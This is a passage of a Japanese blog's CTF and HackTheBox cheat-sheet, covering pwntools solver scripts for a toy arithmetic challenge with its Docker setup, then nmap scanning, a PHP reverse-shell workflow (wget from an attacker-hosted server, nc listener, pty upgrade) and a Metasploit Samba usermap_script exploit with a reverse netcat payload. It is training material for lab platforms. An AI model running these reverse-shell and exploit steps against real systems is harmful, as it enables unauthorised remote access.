+</span></span><span class="line"><span class="cl">        <span class="n">cast</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="s1">&#39;^0x&#39;</span><span class="p">,</span> <span class="n">i</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cast</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cast</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">sum</span> <span class="o">+=</span> <span class="n">cast</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;answer: &#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">sum</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">sum</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="c1"># ターミナルへ書き込む(byte列で与える)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span> <span class="c1"># 全てのレスポンスを表示</span></span></span></code></pre></div></div>
+</figure>
+<ul>
+<li>変数ごとに読み取る場合：<code>p.recvuntil(b'n = ')</code></li>
+</ul>
+<pre tabindex="0"><code>$ nc 127.0.0.1 4649
+Multiply and answer in decimal.
+a = 4290
+b = 1777
+c = 6279
+answer: 
+</code></pre>
+
+
+<figure class="xCodeBlock">
+<figcaption class="xCodeBlock_title">Solver.py</figcaption>
+<div class="xCodeBlock_code"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># p = process([&#34;python&#34;, &#34;main.py&#34;])　# ローカルでプログラムを実行</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="mi">4649</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span> <span class="c1"># 一行取得，改行削除，byte列 -&gt; 文字列 </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a = &#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span> <span class="c1"># &#39;a = &#39;まで読み取る</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="c1"># 一行読み取る</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;b = &#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;c = &#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">ans</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">*</span><span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">*</span><span class="nb">int</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ans</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="c1"># ターミナルへ書き込む(byte列で与える)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span> <span class="c1"># 全てのレスポンスを表示</span></span></span></code></pre></div></div>
+</figure>
+<details><summary>Dockerで試してみる場合の手順</summary>
+<h4 id="まずは以下の四つのファイルを作成">まずは，以下の四つのファイルを作成．</h4>
+
+
+
+<figure class="xCodeBlock">
+<figcaption class="xCodeBlock_title">dockerfile</figcaption>
+<div class="xCodeBlock_code"><pre tabindex="0"><code>FROM python:3.12.4-slim
+
+RUN apt-get clean &amp;&amp; \
+    apt-get update &amp;&amp; \
+    apt-get install -y socat &amp;&amp; \
+    rm -rf /var/lib/apt/lists/*
+
+RUN useradd -m -d /home/admin -s /bin/bash admin
+
+WORKDIR /home/admin
+
+COPY --chown=root:admin --chmod=050 ./main.py ./main.py
+COPY --chown=root:admin --chmod=040 ./flag.py ./flag.py
+
+USER admin
+
+EXPOSE 4649
+
+ENTRYPOINT [&#34;socat&#34;, &#34;-t&#34;, &#34;300&#34;, &#34;-T&#34;, &#34;30&#34;, &#34;TCP-LISTEN:4649,reuseaddr,nodelay,fork&#34;, &#34;EXEC:python3 main.py&#34;]</code></pre></div>
+</figure>
+
+
+
+<figure class="xCodeBlock">
+<figcaption class="xCodeBlock_title">docker-compose.yml</figcaption>
+<div class="xCodeBlock_code"><pre tabindex="0"><code>services:
+  admin:
+    build: .
+    container_name: &#34;Terminal-Hack&#34;
+    ports:
+      - &#34;0.0.0.0:4649:4649&#34;
+    restart: unless-stopped</code></pre></div>
+</figure>
+
+
+
+<figure class="xCodeBlock">
+<figcaption class="xCodeBlock_title">main.py</figcaption>
+<div class="xCodeBlock_code"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flag</span> <span class="kn">import</span> <span class="n">FLAG</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Add and answer in decimal.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">sum</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">num</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">sum</span> <span class="o">+=</span> <span class="n">num</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">num</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">num</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="nb">oct</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;answer: &#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">num</span> <span class="o">==</span> <span class="nb">sum</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Corect! &#34;</span> <span class="o">+</span> <span class="n">FLAG</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;It&#39;s not right.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mult</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Multiply and answer in decimal.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ans</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">num</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ans</span> <span class="o">*=</span> <span class="n">num</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="si">}</span><span class="s2"> = </span><span class="si">{</span><span class="n">num</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;answer: &#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">num</span> <span class="o">==</span> <span class="n">ans</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Corect! &#34;</span> <span class="o">+</span> <span class="n">FLAG</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;It&#39;s not right.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># mult()</span></span></span></code></pre></div></div>
+</figure>
+
+
+
+<figure class="xCodeBlock">
+<figcaption class="xCodeBlock_title">flag.py</figcaption>
+<div class="xCodeBlock_code"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">FLAG</span> <span class="o">=</span> <span class="s2">&#34;flag{good_job!}&#34;</span></span></span></code></pre></div></div>
+</figure>
+<h4 id="ファイルのあるディレクトリで以下を実行">ファイルのあるディレクトリで以下を実行</h4>
+<pre tabindex="0"><code>$ docker-compose up
+</code></pre><br>
+　手動でアクセスする場合は以下のように．  
+<br><br>
+<pre tabindex="0"><code>$ nc 127.0.0.1 4649
+</code></pre><br>
+　Solver.py を実行する場合は以下のように．
+<br><br>
+<pre tabindex="0"><code>$ python Solver.py
+[x] Opening connection to 127.0.0.1 on port 4649
+[x] Opening connection to 127.0.0.1 on port 4649: Trying 127.0.0.1
+[+] Opening connection to 127.0.0.1 on port 4649: Done
+Add and answer in decimal.
+0xa7c
+0o7217
+0b10000110101110
+0xc8
+0b110110111111
+answer:
+18752
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 24B
+[+] Receiving all data: Done (24B)
+[*] Closed connection to 127.0.0.1 port 4649
+Corect! flag{good_job!}
+
+$ python Solver.py
+[x] Opening connection to 127.0.0.1 on port 4649
+[x] Opening connection to 127.0.0.1 on port 4649: Trying 127.0.0.1
+[+] Opening connection to 127.0.0.1 on port 4649: Done
+Multiply and answer in decimal.
+a =
+3811
+b =
+6188
+c =
+6282
+answer:
+148145063976
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 24B
+[+] Receiving all data: Done (24B)
+[*] Closed connection to 127.0.0.1 port 4649
+Corect! flag{good_job!}
+</code></pre></details>
+<h2 id="hacktheboxhtb">HackTheBox(HTB)</h2>
+<h3 id="vpn">VPN</h3>
+<p>HTBの右上の方の<code>CONNECT TO HTB</code>から，<code>DOWNLOAD VPN</code>を押して<code>***.ovpn</code>をダウンロード．</p>
+<pre tabindex="0"><code>$ sudo openvpn ***.ovpn 
+…
+Initialization Sequence Completed
+…
+</code></pre><p>前後に色々ログが出るが，Initialization Sequence Completed が出れば成功．</p>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>$ nmap -Pn -T4 -sV -sC -A [IPアドレス]
+</code></pre><ul>
+<li>Pn: 事前のping送信をしない</li>
+<li>T4: スキャン速度の指定．0~5で数字が高いほど早いがエラーが出やすい</li>
+<li>sV: 動作しているサービスのバージョンを確認</li>
+<li>sC: デフォルトスクリプトスキャン</li>
+<li>A: 詳細スキャン</li>
+<li>v: スキャン中の進捗や詳細を表示．-vv にするとさらに詳細に．</li>
+</ul>
+<h3 id="etchosts">/etc/hosts</h3>
+<p><code>/etc/hosts</code> は名前解決用のローカルファイル．<br>
+ローカルのIPアドレスの名前解決を利用する場合，手動で追加する必要がある．</p>
+<pre tabindex="0"><code>$ sudo vi /etc/hosts
+10.10.11.68     planning.htb
+</code></pre><h3 id="リバースシェル">リバースシェル</h3>
+<p>以下から<code>php-reverse-shell.php</code>をダウンロードする（以下<code>shell.php</code>），</p>
+<p>php-reverse-shell:<br>
+<a href="https://github.com/pentestmonkey/php-reverse-shell"target="_blank" rel="noopener noreferrer">https://github.com/pentestmonkey/php-reverse-shell</a></p>
+<p>IPアドレス（自分のIPアドレス）とポートを設定する．</p>
+<pre tabindex="0"><code>49  $ip = &#39;10.10.x.x&#39;;  // CHANGE THIS
+50  $port = 4444; // CHANGE THIS
+</code></pre><p>netcatでリッスン状態にしておく．</p>
+<pre tabindex="0"><code>$ nc -lvvp 4444
+</code></pre><h4 id="wgetでダウンロードする場合">①wgetでダウンロードする場合</h4>
+<p><code>shell.php</code>のあるディレクトリで，以下を実行し簡易サーバを立てる．</p>
+<pre tabindex="0"><code>$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre><p>ダウンロードしたい場所で以下を実行するとダウンロードできる．</p>
+<pre tabindex="0"><code>$ wget [自分のIPアドレス]:8000/shell.php
+or
+$ bash -c &#34;wget [自分のIPアドレス]:8000/shell.php&#34;
+</code></pre><p>以下で shell.php を実行させる．</p>
+<pre tabindex="0"><code>$ php shell.php
+or
+$ bash -c &#34;php shell.php&#34;
+</code></pre><h4 id="アップロード機能を利用する場合">②アップロード機能を利用する場合</h4>
+<p><code>shell.php</code>をアップロード機能を用いてアップロードする．<br>
+phpが許可されていない場合は，使用可能な拡張子に変更．<br>
+格納されたディレクトリに，ブラウザまたはcurlコマンドでアクセス．</p>
+<p>①または②でシェルが取得出来たら，以下を実行してシェルを安定化させる．</p>
+<pre tabindex="0"><code>$ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;);&#39;
+</code></pre><p>参考：<br>
+<a href="https://qiita.com/Brutus/items/1f9b1db93482ffbca6c2"target="_blank" rel="noopener noreferrer">https://qiita.com/Brutus/items/1f9b1db93482ffbca6c2</a></p>
+<h3 id="searchsploit">searchsploit</h3>
+<p>脆弱性の検索．</p>
+<pre tabindex="0"><code>$ searchsploit vsFTPd 2.3.4 
+----------------------------------------------------------- ---------------------------------
+ Exploit Title                                             |  Path
+----------------------------------------------------------- ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution                  | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)     | unix/remote/17491.rb
+----------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+$ searchsploit samba 3.0.20
+----------------------------------------------------------- ---------------------------------
+ Exploit Title                                             |  Path
+----------------------------------------------------------- ---------------------------------
+Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass     | multiple/remote/10095.txt
+Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command  | unix/remote/16320.rb
+Samba &lt; 3.0.20 - Remote Heap Overflow                      | linux/remote/7701.txt
+Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)              | linux_x86/dos/36741.py
+----------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><h3 id="metasploit">Metasploit</h3>
+<p>Metasploit Frameworkは攻撃コードの作成，実行を行うためのフレームワークソフトウエア．</p>
+<pre tabindex="0"><code>$ msfconsole
+msf6 &gt; search Samba 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba &#34;username map script&#34; Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
+
+msf6 &gt; use exploit/multi/samba/usermap_script
+msf6 exploit(multi/samba/usermap_script) &gt; options
+
+odule options (exploit/multi/samba/usermap_script):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:po
+                                       rt][...]
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/
+                                       docs/using-metasploit/basics/using-metasploit.html
+   RPORT    139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  172.19.46.189    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+msf6 exploit(multi/samba/usermap_script) &gt; set rhosts [ターゲットのIPアドレス]
+msf6 exploit(multi/samba/usermap_script) &gt; set lhost [攻撃者側のIPアドレス]
+msf6 exploit(multi/samba/usermap_script) &gt; run
+</code></pre><h3 id="linuxコマンド">linuxコマンド</h3>
+<pre tabindex="0"><code>$ whoami    // 現在ログイン中のユーザー名を表示
+root
+
+$ id    // uid：ユーザーID，gid：Group ID，groups：所属しているすべてのグループ
+uid=0(root) gid=0(root) groups=0(root)
+
+$ su [ユーザー名]   // ユーザーを一時的に切り替える
+
+$ sudo -l    // sudo権限の一覧
+
+$ find / -name user.txt
+$ find / -name root.txt
+
+$ grep -r &#34;pass&#34; ./folder
+$ grep -r &#34;database&#34; ./folder | grep &#34;root&#34;
+
+$ tar -xjf xxx.tar.bz2
+</code></pre></article><section class="article labels"><a class="category" href="/starknote/categories/security/">Security</a><a class="category" href="/starknote/categories/programming/">Programming</a><a class="tag" href="/starknote/tags/ctf/">CTF</a><a class="tag" href="/starknote/tags/htb/">HTB</a></section><section class="article author"><img class="avatar" src="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/stable-diffusion/immy.png" alt><p class="name">しゅたるく (Stark)</p><div class="details"><a class="item" href="https://github.com/stark2420" target="_blank" rel="noopener noreferrer"><span class="iconfont icon-github"></span>&nbsp;stark2420</a><a class="item" href="https://twitter.com/stark_puyo" target="_blank" rel="noopener noreferrer"><span class="iconfont icon-twitter"></span>&nbsp;@stark_puyo</a></div>
+</section>
+</div>
+
+<button id="toggle-button" class="nomal-style">
+  <h1>目次</h1>
+</button>
+<div id="toc-container" class="toc-container">
+  
+      <h2><a href="#top">目次</a></h2>
+      <div id="toc" class="toc">
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#forensics">Forensics</a>
+      <ul>
+        <li><a href="#exiftool">exiftool</a></li>
+        <li><a href="#pdftotext">pdftotext</a></li>
+        <li><a href="#qrコード">QRコード</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#buffer-overflow-bof">Buffer Overflow (BOF)</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#ffuf">FFUF</a></li>
+        <li><a href="#git">.git/</a></li>
+        <li><a href="#curlコマンド">curlコマンド</a></li>
+        <li><a href="#urlエンコード">URLエンコード</a></li>
+        <li><a href="#文字コード">文字コード</a></li>
+        <li><a href="#xss">XSS</a></li>
+        <li><a href="#sstiserver-side-template-injection">SSTI(Server-Side Template Injection)</a></li>
+        <li><a href="#探索">探索</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint">Osint</a>
+      <ul>
+        <li><a href="#検索方法">検索方法</a></li>
+        <li><a href="#国立国会図書館デジタルコレクション">国立国会図書館デジタルコレクション</a></li>
+        <li><a href="#ウェブアーカイブ">ウェブアーカイブ</a></li>
+        <li><a href="#whois検索ドメイン取得日など">WHOIS検索(ドメイン取得日など)</a></li>
+        <li><a href="#ホスティングサービス">ホスティングサービス</a></li>
+        <li><a href="#11foot8">11foot8</a></li>
+        <li><a href="#google-earth">Google Earth</a></li>
+        <li><a href="#gmailアドレス">Gmailアドレス</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#何の暗号かを調べる">何の暗号かを調べる</a></li>
+        <li><a href="#国際信号旗">国際信号旗</a></li>
+        <li><a href="#burrows-wheeler変換-bwtブロックソート">Burrows-Wheeler変換 (BWT)，ブロックソート</a></li>
+        <li><a href="#モールス信号">モールス信号</a></li>
+        <li><a href="#シーザー暗号">シーザー暗号</a></li>
+        <li><a href="#単一換字式暗号">単一換字式暗号</a></li>
+        <li><a href="#ビジュネル暗号">ビジュネル暗号</a></li>
+        <li><a href="#素因数分解">素因数分解</a></li>
+        <li><a href="#cyberchef">CyberChef</a></li>
+        <li><a href="#ハッシュ値">ハッシュ値</a></li>
+        <li><a href="#脆弱なrsa暗号">脆弱なRSA暗号</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#ターミナルの入出力の自動化">ターミナルの入出力の自動化</a></li>
+      </ul>
+    </li>
+    <li><a href="#hacktheboxhtb">HackTheBox(HTB)</a>
+      <ul>
+        <li><a href="#vpn">VPN</a></li>
+        <li><a href="#nmap">nmap</a></li>
+        <li><a href="#etchosts">/etc/hosts</a></li>
+        <li><a href="#リバースシェル">リバースシェル</a></li>
+        <li><a href="#searchsploit">searchsploit</a></li>
+        <li><a href="#metasploit">Metasploit</a></li>
+        <li><a href="#linuxコマンド">linuxコマンド</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      </div>
+  
+</div>
+
+<script>
+  
+  document.querySelectorAll('.toc-container a').forEach(link => {
+    link.addEventListener('click', function() {
+      
+      if (window.innerWidth < 1600) {
+        
+        const tocContainer = document.querySelector('.toc-container');
+        if (tocContainer) {
+          tocContainer.style.display = 'none';
+        }
+      }
+    });
+  });
+
+  
+  document.getElementById('toggle-button').addEventListener('click', function() {
+    var toc = document.getElementById('toc-container');
+    var button = document.getElementById('toggle-button');
+    
+    
+    if (toc.style.display === 'none') {
+      toc.style.display = 'block';
+      button.innerHTML = '<h1>目次</h1>';  
+    } else {
+      toc.style.display = 'none';
+      button.innerHTML = '<h1>目次</h1>';  
+    }
+  });
+
+  function highlightActiveTocItem() {
+    const tocItems = document.querySelectorAll('.toc a');
+
+    tocItems.forEach(item => {
+      const targetId = item.getAttribute('href').substring(1); 
+      const targetElement = document.getElementById(targetId);
+
+      if (targetElement) {
+        const rect = targetElement.getBoundingClientRect();
+        
+        
+        const isInViewport = rect.top <= 200 && rect.bottom > 0;
+
+        if (isInViewport) {
+          
+          tocItems.forEach(item => {
+            item.classList.remove('active');
+          });
+          
+          item.classList.add('active');
+        }
+      }
+    });
+  }
+
+  
+  window.addEventListener('scroll', highlightActiveTocItem);
+  document.addEventListener('DOMContentLoaded', highlightActiveTocItem);  
+</script>
+
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/starknote/post/ctf-data/"><span class="iconfont icon-article"></span>📌CTF Writeups</a></p></section><section class="article discussion"><div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "starknote" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+		<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+		<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+	</section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">©2020 Notepadium.</p>
+    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
+        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank" rel="noopener noreferrer">Notepadium</a>
+<a href='https://ipv6-test.com/validate.php?url=referer'
+  ><img src='https://ipv6-test.com/button-ipv6-80x15.png' 
+        alt='ipv6 ready' title='ipv6 ready' border='0' 
+/></a>
